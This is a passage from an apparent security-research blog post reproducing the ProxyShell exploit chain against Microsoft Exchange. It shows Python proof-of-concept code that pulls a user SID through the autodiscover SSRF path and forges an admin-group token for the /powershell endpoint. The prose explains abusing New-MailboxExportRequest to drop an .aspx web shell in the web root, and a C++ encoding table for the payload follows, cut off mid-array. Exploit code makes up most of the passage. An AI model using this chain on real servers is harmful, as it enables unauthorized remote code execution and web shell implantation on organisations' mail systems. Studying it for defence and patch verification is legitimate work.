class="string">f&quot;/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&amp;Email=autodiscover/autodiscover.json%3F@test.com&quot;</span></span><br><span class="line">    resp = requests.post(sid_endpoint, data=data,</span><br><span class="line">                         headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    sid = resp.text.split(<span class="string">&quot;with SID &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot; and MasterAccountSid&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully get User SID&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sid</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I copy the <code>gen_token</code> function from <a target="_blank" rel="noopener" href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/">this amazing write up</a> to help me build the poc script&#x2F;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_token</span>(<span class="params">email: <span class="built_in">str</span>, sid: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Generating token&quot;</span>)</span><br><span class="line">    version = <span class="number">0</span></span><br><span class="line">    ttype = <span class="string">&#x27;Windows&#x27;</span></span><br><span class="line">    compressed = <span class="number">0</span></span><br><span class="line">    auth_type = <span class="string">&#x27;Kerberos&#x27;</span></span><br><span class="line">    raw_token = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    gsid = <span class="string">&#x27;S-1-5-32-544&#x27;</span></span><br><span class="line"></span><br><span class="line">    version_data = <span class="string">b&#x27;V&#x27;</span> + (<span class="number">1</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">        (version).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    type_data = <span class="string">b&#x27;T&#x27;</span> + (<span class="built_in">len</span>(ttype)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>) + ttype.encode()</span><br><span class="line">    compress_data = <span class="string">b&#x27;C&#x27;</span> + (compressed).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    auth_data = <span class="string">b&#x27;A&#x27;</span> + (<span class="built_in">len</span>(auth_type)).to_bytes(<span class="number">1</span>,</span><br><span class="line">                                                 <span class="string">&#x27;little&#x27;</span>) + auth_type.encode()</span><br><span class="line">    login_data = <span class="string">b&#x27;L&#x27;</span> + (<span class="built_in">len</span>(email)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>) + email.encode()</span><br><span class="line">    user_data = <span class="string">b&#x27;U&#x27;</span> + (<span class="built_in">len</span>(sid)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>) + sid.encode()</span><br><span class="line">    group_data = <span class="string">b&#x27;G&#x27;</span> + struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, <span class="number">1</span>, <span class="number">7</span>) + \</span><br><span class="line">        (<span class="built_in">len</span>(gsid)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>) + gsid.encode()</span><br><span class="line">    ext_data = <span class="string">b&#x27;E&#x27;</span> + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    raw_token += version_data</span><br><span class="line">    raw_token += type_data</span><br><span class="line">    raw_token += compress_data</span><br><span class="line">    raw_token += auth_data</span><br><span class="line">    raw_token += login_data</span><br><span class="line">    raw_token += user_data</span><br><span class="line">    raw_token += group_data</span><br><span class="line">    raw_token += ext_data</span><br><span class="line"></span><br><span class="line">    data = base64.b64encode(raw_token).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Token generated: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Use the token to request to <code>/powershell</code> endpoint, if the server return with 200 status code, that means the token is accepted</p>
<img width="1086" alt="image" src="https://user-images.githubusercontent.com/37280106/129684825-739bcc15-0c50-4bf9-a0b6-d1716c272970.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129684825-739bcc15-0c50-4bf9-a0b6-d1716c272970.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>So now, we can execute arbitrary Powershell code on the exchange server with Admin priviledge. But the Powershell Cmdlet module come with a very limited list of commands that we can execute. We want more than that !!!</p>
<h3 id="3-Working-with-remote-Powershell-and-archieved-the-post-auth-RCE"><a href="#3-Working-with-remote-Powershell-and-archieved-the-post-auth-RCE" class="headerlink" title="3. Working with remote Powershell and archieved the post-auth RCE"></a>3. Working with remote Powershell and archieved the post-auth RCE</h3><p>Since we are now an admin of Exchange Server, there are many potential commands to abuse to get Post Auth RCE. I will use the <code>New-MailboxExportRequest</code> command</p>
<p>According to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest?view=exchange-ps">Microsoft docs</a>,  <code>New-MailboxExportRequest</code> allow us to export user’s mailbox to a file. That allow us to write arbitrary file to any location, we can write our shell to web root location of Exchange server.</p>
<p>This is where the arbitrary write file happens, the API doesn’t check that the exported files have to be a certain format extension, like <code>.pst,...</code>, so we can use that and export our payload to any file extension, like <code>abc.aspx</code> for example </p>
<p>ex:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MailboxExportRequest</span> <span class="literal">-Mailbox</span> AylaKol <span class="literal">-FilePath</span> <span class="string">&quot;\\SERVER01\PSTFileShare\Ayla_Recovered.pst&quot;</span></span><br></pre></td></tr></table></figure>

<p>The exported file is encoded and in <code>PST</code> format. Now come the fun part, how do we write the data to mailbox so that after the mail is exported into a PST file, it still a useable shell for us ?. </p>
<p>Follow Orange Tsai’s talk, he showed us how to encode the payload first and then send it to the Exchange Server, when the Exchange server try to save and export the file and encode it again, it will turns it into the orginal malicious code . This <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd">MS-doc</a> will help us how to encode our shell before sending.</p>
<p>At the time I was writing this research, I haven’t found any way to implement this in python, so I copied the C++ code from Microsoft Blog and modify it a little bit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BYTE mpbbCrypt[] =</span><br><span class="line">&#123;</span><br><span class="line">     <span class="number">65</span>,  <span class="number">54</span>,  <span class="number">19</span>,  <span class="number">98</span>, <span class="number">168</span>,  <span class="number">33</span>, <span class="number">110</span>, <span class="number">187</span>,</span><br><span class="line">    <span class="number">244</span>,  <span class="number">22</span>, <span class="number">204</span>,   <span class="number">4</span>, <span class="number">127</span>, <span class="number">100</span>, <span class="number">232</span>,  <span class="number">93</span>,</span><br><span class="line">     <span class="number">30</span>, <span class="number">242</span>, <span class="number">203</span>,  <span class="number">42</span>, <span class="number">116</span>, <span class="number">197</span>,  <span class="number">94</span>,  <span class="number">53</span>,</span><br><span class="line">    <span class="number">210</span>, <span class="number">149</span>,  <span class="number">71</span>, <span class="number">158</span>, <span class="number">150</span>,  <span class="number">45</span>, <span class="number">154</span>, <span class="number">136</span>,</span><br><span class="line">     <span class="number">76</span>, <span class="number">125</span>, <span class="number">132</span>,  <span class="number">63</span>, <span class="number">219</span>, <span class="number">172</span>,  <span class="number">49</span>, <span class="number">182</span>,</span><br><span class="line">     <span class="number">72</span>,  <span class="number">95</span>, <span class="number">246</span>, <span class="number">196</span>, <span class="number">216</span>,  <span class="number">57</span>, <span class="number">139</span>, <span class="number">231</span>,</span><br><span class="line">     <span class="number">35</span>,  <span class="number">59</span>,  <span class="number">56</span>, <span class="number">142</span>, <span class="number">200</span>, <span class="number">193</span>, <span class="number">223</span>,  <span class="number">37</span>,</span><br><span class="line">    <span class="number">177</span>,  <span class="number">32</span>, <span class="number">165</span>,  <span class="number">70</span>,  <span class="number">96</span>,  <span class="number">78</span>, <span class="number">156</span>, <span class="number">251</span>,</span><br><span class="line">    <span class="number">170</span>, <span class="number">211</span>,  <span class="number">86</span>,  <span class="number">81</span>,  <span class="number">69</span>, <span class="number">124</span>,  <span class="number">85</span>,   <span class="number">0</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">201</span>,  <span class="number">43</span>, <span class="number">157</span>, <span class="number">133</span>, <span class="number">155</span>,   <span class="number">9</span>, <span class="number">160</span>,</span><br><span class="line">    <span class="number">143</span>, <span class="number">173</span>, <span class="number">179</span>,  <span class="number">15</span>,  <span class="number">99</span>, <span class="number">171</span>, <span class="number">137</span>,  <span class="number">75</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">167</span>,  <span class="number">21</span>,  <span class="number">90</span>, <span class="number">113</span>, <span class="number">102</span>,  <span class="number">66</span>, <span class="number">191</span>,</span><br><span class="line">     <span class="number">38</span>,  <span class="number">74</span>, <span class="number">107</span>, <span class="number">152</span>, <span class="number">250</span>, <span class="number">234</span>, <span class="number">119</span>,  <span class="number">83</span>,</span><br><span class="line">    <span class="number">178</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">44</span>, <span class="number">253</span>,  <span class="number">89</span>,  <span class="number">58</span>, <span class="number">134</span>,</span><br><span class="line">    <span class="number">126</span>, <span class="number">206</span>,   <span class="number">6</span>, <span class="number">235</span>, <span class="number">130</span>, <span class="number">120</span>,  <span class="number">87</span>, <span class="number">199</span>,</span><br><span class="line">    <span class="number">141</span>,  <span class="number">67</span>, <span class="number">175</span>, <span class="number">180</span>,  <span class="number">28</span>, <span class="number">212</span>,  <span class="number">91</span>, <span class="number">205</span>,</span><br><span class="line">    <span class="number">226</span>, <span class="number">233</span>,  <span class="number">39</span>,  <span class="number">79</span>, <span class="number">195</span>,   <span class="number">8</span>, <span class="number">114</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">207</span>, <span class="number">176</span>, <span class="number">239</span>, <span class="number">245</span>,  <span class="number">40</span>, <span class="number">109</span>, <span class="number">190</span>,  <span class="number">48</span>,</span><br><span class="line">     <span class="number">77</span>,  <span class="number">52</span>, <span class="number">146</span>, <span class="number">213</span>,  <span class="number">14</span>,  <span class="number">60</span>,  <span class="number">34</span>,  <span class="number">50</span>,</span><br><span class="line">    <span class="number">229</span>, <span class="number">228</span>, <span class="number">249</span>, <span class="number">159</span>, <span class="number">194</span>, <span class="number">209</span>,  <span class="number">10</span>, <span class="number">129</span>,</span><br><span class="line">     <span class="number">18</span>, <span class="number">225</span>, <span class="number">238</span>, <span class="number">145</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">227</span>, <span class="number">151</span>,</span><br><span class="line">    <span class="number">230</span>,  <span class="number">97</span>, <span class="number">138</span>,  <span class="number">23</span>, <span class="number">121</span>, <span class="number">164</span>, <span class="number">183</span>, <span class="number">220</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">122</span>,  <span class="number">92</span>, <span class="number">140</span>,   <span class="number">2</span>, <span class="number">166</span>, <span class="number">202</span>, <span class="number">105</span>,</span><br><span class="line">    <span class="number">222</span>,  <span class="number">80</span>,  <span class="number">26</span>,  <span class="number">17</span>, <span class="number">147</span>, <span class="number">185</span>,  <span class="number">82</span>, <span class="number">135</span>,</span><br><span class="line">     <span class="number">88</span>, <span class="number">252</span>, <span class="number">237</span>,  <span class="number">29</span>,  <span class="number">55</span>,  <span class="number">73</span>,  <span class="number">27</span>, <span class="number">106</span>,</span><br><span class="line">    <span class="number">224</span>,  <span class="number">41</span>,  <span class="number">51</span>, <span class="number">153</span>, <span class="number">189</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">148</span>,</span><br><span class="line">    <span class="number">243</span>,  <span class="number">64</span>,  <span class="number">84</span>, <span class="number">111</span>, <span class="number">240</span>, <span class="number">198</span>, <span class="number">115</span>, <span class="number">184</span>,</span><br><span class="line">    <span class="number">214</span>,  <span class="number">62</span>, <span class="number">101</span>,  <span class="number">24</span>,  <span class="number">68</span>,  <span class="number">31</span>, <span class="number">221</span>, <span class="number">103</span>,</span><br><span class="line">     <span class="number">16</span>, <span class="number">241</span>,  <span class="number">12</span>,  <span class="number">25</span>, <span class="number">236</span>, <span class="number">174</span>,   <span class="number">3</span>, <span class="number">161</span>,</span><br><span class="line">     <span class="number">20</span>, <span class="number">123</span>, <span class="number">169</span>,  <span class="number">11</span>, <span class="number">255</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">192</span>,</span><br><span class="line">    <span class="number">162</span>,   <span class="number">1</span>, <span class="number">247</span>,  <span class="number">46</span>, <span class="number">188</span>,  <span class="number">36</span>, <span class="number">104</span>, <span class="number">117</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">254</span>, <span class="number">186</span>,  <span class="number">47</span>, <span class="number">181</span>, <span class="number">208</span>, <span class="number">218</span>,  <span class="number">61</span>,</span><br><span class="line">     <span class="number">20</span>,  <span class="number">83</span>,  <span class="number">15</span>,  <span class="number">86</span>, <span class="number">179</span>, <span class="number">200</span>, <span class="number">122</span>, <span class="number">156</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">101</span>,  <span class="number">72</span>,  <span class="number">23</span>,  <span class="number">22</span>,  <span class="number">21</span>, <span class="number">159</span>,   <span class="number">2</span>,</span><br><span class="line">    <span class="number">204</span>,  <span class="number">84</span>, <span class="number">124</span>, <span class="number">131</span>,   <span class="number">0</span>,  <span class="number">13</span>,  <span class="number">12</span>,  <span class="number">11</span>,</span><br><span class="line">    <span class="number">162</span>,  <span class="number">98</span>, <span class="number">168</span>, <span class="number">118</span>, <span class="number">219</span>, <span class="number">217</span>, <span class="number">237</span>, <span class="number">199</span>,</span><br><span class="line">    <span class="number">197</span>, <span class="number">164</span>, <span class="number">220</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">116</span>, <span class="number">214</span>, <span class="number">208</span>,</span><br><span class="line">    <span class="number">167</span>, <span class="number">155</span>, <span class="number">174</span>, <span class="number">154</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">195</span>,</span><br><span class="line">     <span class="number">99</span>, <span class="number">153</span>, <span class="number">184</span>, <span class="number">221</span>, <span class="number">115</span>, <span class="number">146</span>, <span class="number">142</span>, <span class="number">132</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">165</span>,  <span class="number">94</span>, <span class="number">209</span>,  <span class="number">93</span>, <span class="number">147</span>, <span class="number">177</span>,  <span class="number">87</span>,</span><br><span class="line">     <span class="number">81</span>,  <span class="number">80</span>, <span class="number">128</span>, <span class="number">137</span>,  <span class="number">82</span>, <span class="number">148</span>,  <span class="number">79</span>,  <span class="number">78</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">107</span>, <span class="number">188</span>, <span class="number">141</span>, <span class="number">127</span>, <span class="number">110</span>,  <span class="number">71</span>,  <span class="number">70</span>,</span><br><span class="line">     <span class="number">65</span>,  <span class="number">64</span>,  <span class="number">68</span>,   <span class="number">1</span>,  <span class="number">17</span>, <span class="number">203</span>,   <span class="number">3</span>,  <span class="number">63</span>,</span><br><span class="line">    <span class="number">247</span>, <span class="number">244</span>, <span class="number">225</span>, <span class="number">169</span>, <span class="number">143</span>,  <span class="number">60</span>,  <span class="number">58</span>, <span class="number">249</span>,</span><br><span class="line">    <span class="number">251</span>, <span class="number">240</span>,  <span class="number">25</span>,  <span class="number">48</span>, <span class="number">130</span>,   <span class="number">9</span>,  <span class="number">46</span>, <span class="number">201</span>,</span><br><span class="line">    <span class="number">157</span>, <span class="number">160</span>, <span class="number">134</span>,  <span class="number">73</span>, <span class="number">238</span>, <span class="number">111</span>,  <span class="number">77</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">196</span>,  <span class="number">45</span>, <span class="number">129</span>,  <span class="number">52</span>,  <span class="number">37</span>, <span class="number">135</span>,  <span class="number">27</span>, <span class="number">136</span>,</span><br><span class="line">    <span class="number">170</span>, <span class="number">252</span>,   <span class="number">6</span>, <span class="number">161</span>,  <span class="number">18</span>,  <span class="number">56</span>, <span class="number">253</span>,  <span class="number">76</span>,</span><br><span class="line">     <span class="number">66</span>, <span class="number">114</span>, <span class="number">100</span>,  <span class="number">19</span>,  <span class="number">55</span>,  <span class="number">36</span>, <span class="number">106</span>, <span class="number">117</span>,</span><br><span class="line">    <span class="number">119</span>,  <span class="number">67</span>, <span class="number">255</span>, <span class="number">230</span>, <span class="number">180</span>,  <span class="number">75</span>,  <span class="number">54</span>,  <span class="number">92</span>,</span><br><span class="line">    <span class="number">228</span>, <span class="number">216</span>,  <span class="number">53</span>,  <span class="number">61</span>,  <span class="number">69</span>, <span class="number">185</span>,  <span class="number">44</span>, <span class="number">236</span>,</span><br><span class="line">    <span class="number">183</span>,  <span class="number">49</span>,  <span class="number">43</span>,  <span class="number">41</span>,   <span class="number">7</span>, <span class="number">104</span>, <span class="number">163</span>,  <span class="number">14</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">123</span>,  <span class="number">24</span>, <span class="number">158</span>,  <span class="number">33</span>,  <span class="number">57</span>, <span class="number">190</span>,  <span class="number">40</span>,</span><br><span class="line">     <span class="number">26</span>,  <span class="number">91</span>, <span class="number">120</span>, <span class="number">245</span>,  <span class="number">35</span>, <span class="number">202</span>,  <span class="number">42</span>, <span class="number">176</span>,</span><br><span class="line">    <span class="number">175</span>,  <span class="number">62</span>, <span class="number">254</span>,   <span class="number">4</span>, <span class="number">140</span>, <span class="number">231</span>, <span class="number">229</span>, <span class="number">152</span>,</span><br><span class="line">     <span class="number">50</span>, <span class="number">149</span>, <span class="number">211</span>, <span class="number">246</span>,  <span class="number">74</span>, <span class="number">232</span>, <span class="number">166</span>, <span class="number">234</span>,</span><br><span class="line">    <span class="number">233</span>, <span class="number">243</span>, <span class="number">213</span>,  <span class="number">47</span>, <span class="number">112</span>,  <span class="number">32</span>, <span class="number">242</span>,  <span class="number">31</span>,</span><br><span class="line">      <span class="number">5</span>, <span class="number">103</span>, <span class="number">173</span>,  <span class="number">85</span>,  <span class="number">16</span>, <span class="number">206</span>, <span class="number">205</span>, <span class="number">227</span>,</span><br><span class="line">     <span class="number">39</span>,  <span class="number">59</span>, <span class="number">218</span>, <span class="number">186</span>, <span class="number">215</span>, <span class="number">194</span>,  <span class="number">38</span>, <span class="number">212</span>,</span><br><span class="line">    <span class="number">145</span>,  <span class="number">29</span>, <span class="number">210</span>,  <span class="number">28</span>,  <span class="number">34</span>,  <span class="number">51</span>, <span class="number">248</span>, <span class="number">250</span>,</span><br><span class="line">    <span class="number">241</span>,  <span class="number">90</span>, <span class="number">239</span>, <span class="number">207</span>, <span class="number">144</span>, <span class="number">182</span>, <span class="number">139</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">189</span>, <span class="number">192</span>, <span class="number">191</span>,   <span class="number">8</span>, <span class="number">151</span>,  <span class="number">30</span>, <span class="number">108</span>, <span class="number">226</span>,</span><br><span class="line">     <span class="number">97</span>, <span class="number">224</span>, <span class="number">198</span>, <span class="number">193</span>,  <span class="number">89</span>, <span class="number">171</span>, <span class="number">187</span>,  <span class="number">88</span>,</span><br><span class="line">    <span class="number">222</span>,  <span class="number">95</span>, <span class="number">223</span>,  <span class="number">96</span>, <span class="number">121</span>, <span class="number">126</span>, <span class="number">178</span>, <span class="number">138</span>,</span><br><span class="line">     <span class="number">71</span>, <span class="number">241</span>, <span class="number">180</span>, <span class="number">230</span>,  <span class="number">11</span>, <span class="number">106</span>, <span class="number">114</span>,  <span class="number">72</span>,</span><br><span class="line">    <span class="number">133</span>,  <span class="number">78</span>, <span class="number">158</span>, <span class="number">235</span>, <span class="number">226</span>, <span class="number">248</span>, <span class="number">148</span>,  <span class="number">83</span>,</span><br><span class="line">    <span class="number">224</span>, <span class="number">187</span>, <span class="number">160</span>,   <span class="number">2</span>, <span class="number">232</span>,  <span class="number">90</span>,   <span class="number">9</span>, <span class="number">171</span>,</span><br><span class="line">    <span class="number">219</span>, <span class="number">227</span>, <span class="number">186</span>, <span class="number">198</span>, <span class="number">124</span>, <span class="number">195</span>,  <span class="number">16</span>, <span class="number">221</span>,</span><br><span class="line">     <span class="number">57</span>,   <span class="number">5</span>, <span class="number">150</span>,  <span class="number">48</span>, <span class="number">245</span>,  <span class="number">55</span>,  <span class="number">96</span>, <span class="number">130</span>,</span><br><span class="line">    <span class="number">140</span>, <span class="number">201</span>,  <span class="number">19</span>,  <span class="number">74</span>, <span class="number">107</span>,  <span class="number">29</span>, <span class="number">243</span>, <span class="number">251</span>,</span><br><span class="line">    <span class="number">143</span>,  <span class="number">38</span>, <span class="number">151</span>, <span class="number">202</span>, <span class="number">145</span>,  <span class="number">23</span>,   <span class="number">1</span>, <span class="number">196</span>,</span><br><span class="line">     <span class="number">50</span>,  <span class="number">45</span>, <span class="number">110</span>,  <span class="number">49</span>, <span class="number">149</span>, <span class="number">255</span>, <span class="number">217</span>,  <span class="number">35</span>,</span><br><span class="line">    <span class="number">209</span>,   <span class="number">0</span>,  <span class="number">94</span>, <span class="number">121</span>, <span class="number">220</span>,  <span class="number">68</span>,  <span class="number">59</span>,  <span class="number">26</span>,</span><br><span class="line">     <span class="number">40</span>, <span class="number">197</span>,  <span class="number">97</span>,  <span class="number">87</span>,  <span class="number">32</span>, <span class="number">144</span>,  <span class="number">61</span>, <span class="number">131</span>,</span><br><span class="line">    <span class="number">185</span>,  <span class="number">67</span>, <span class="number">190</span>, <span class="number">103</span>, <span class="number">210</span>,  <span class="number">70</span>,  <span class="number">66</span>, <span class="number">118</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">109</span>,  <span class="number">91</span>, <span class="number">126</span>, <span class="number">178</span>,  <span class="number">15</span>,  <span class="number">22</span>,  <span class="number">41</span>,</span><br><span class="line">     <span class="number">60</span>, <span class="number">169</span>,   <span class="number">3</span>,  <span class="number">84</span>,  <span class="number">13</span>, <span class="number">218</span>,  <span class="number">93</span>, <span class="number">223</span>,</span><br><span class="line">    <span class="number">246</span>, <span class="number">183</span>, <span class="number">199</span>,  <span class="number">98</span>, <span class="number">205</span>, <span class="number">141</span>,   <span class="number">6</span>, <span class="number">211</span>,</span><br><span class="line">    <span class="number">105</span>,  <span class="number">92</span>, <span class="number">134</span>, <span class="number">214</span>,  <span class="number">20</span>, <span class="number">247</span>, <span class="number">165</span>, <span class="number">102</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">172</span>, <span class="number">177</span>, <span class="number">233</span>,  <span class="number">69</span>,  <span class="number">33</span>, <span class="number">112</span>,  <span class="number">12</span>,</span><br><span class="line">    <span class="number">135</span>, <span class="number">159</span>, <span class="number">116</span>, <span class="number">164</span>,  <span class="number">34</span>,  <span class="number">76</span>, <span class="number">111</span>, <span class="number">191</span>,</span><br><span class="line">     <span class="number">31</span>,  <span class="number">86</span>, <span class="number">170</span>,  <span class="number">46</span>, <span class="number">179</span>, <span class="number">120</span>,  <span class="number">51</span>,  <span class="number">80</span>,</span><br><span class="line">    <span class="number">176</span>, <span class="number">163</span>, <span class="number">146</span>, <span class="number">188</span>, <span class="number">207</span>,  <span class="number">25</span>,  <span class="number">28</span>, <span class="number">167</span>,</span><br><span class="line">     <span class="number">99</span>, <span class="number">203</span>,  <span class="number">30</span>,  <span class="number">77</span>,  <span class="number">62</span>,  <span class="number">75</span>,  <span class="number">27</span>, <span class="number">155</span>,</span><br><span class="line">     <span class="number">79</span>, <span class="number">231</span>, <span class="number">240</span>, <span class="number">238</span>, <span class="number">173</span>,  <span class="number">58</span>, <span class="number">181</span>,  <span class="number">89</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">234</span>,  <span class="number">64</span>,  <span class="number">85</span>,  <span class="number">37</span>,  <span class="number">81</span>, <span class="number">229</span>, <span class="number">122</span>,</span><br><span class="line">    <span class="number">137</span>,  <span class="number">56</span>, <span class="number">104</span>,  <span class="number">82</span>, <span class="number">123</span>, <span class="number">252</span>,  <span class="number">39</span>, <span class="number">174</span>,</span><br><span class="line">    <span class="number">215</span>, <span class="number">189</span>, <span class="number">250</span>,   <span class="number">7</span>, <span class="number">244</span>, <span class="number">204</span>, <span class="number">142</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">239</span>,  <span class="number">53</span>, <span class="number">156</span>, <span class="number">132</span>,  <span class="number">43</span>,  <span class="number">21</span>, <span class="number">213</span>, <span 